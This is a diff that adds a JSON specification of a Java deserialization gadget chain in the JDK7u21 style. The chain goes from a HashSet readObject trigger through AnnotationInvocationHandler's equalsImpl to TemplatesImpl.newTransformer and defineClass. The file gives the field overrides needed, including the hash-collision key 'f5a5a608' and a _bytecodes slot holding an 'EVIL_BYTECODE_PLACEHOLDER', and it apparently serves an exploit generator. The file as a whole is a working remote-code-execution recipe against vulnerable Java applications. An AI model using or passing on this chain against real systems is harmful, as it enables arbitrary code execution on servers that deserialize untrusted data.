@@ -1,0 +1,26 @@
+{
+  "chain_type": "Post-PSU: AnnotationInvocationHandler JDK7u21-style proxy chain",
+  "root_class": "java.util.HashSet",
+  "root_trigger": "readObject→HashMap.put→hashCode→AnnotationInvocationHandler.invoke→equalsImpl",
+  "links": [
+    {
+      "class": "sun.reflect.annotation.AnnotationInvocationHandler",
+      "field_overrides": {
+        "type": "javax.xml.transform.Templates",
+        "memberValues": {
+          "f5a5a608": "f5a5a608"
+        }
+      }
+    },
+    {
+      "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      "field_overrides": {
+        "_bytecodes": ["EVIL_BYTECODE_PLACEHOLDER"],
+        "_name": "Exploit",
+        "_tfactory": {},
+        "_outputProperties": null
+      }
+    }
+  ],
+  "sink_method": "TemplatesImpl.newTransformer→defineClass"
+}
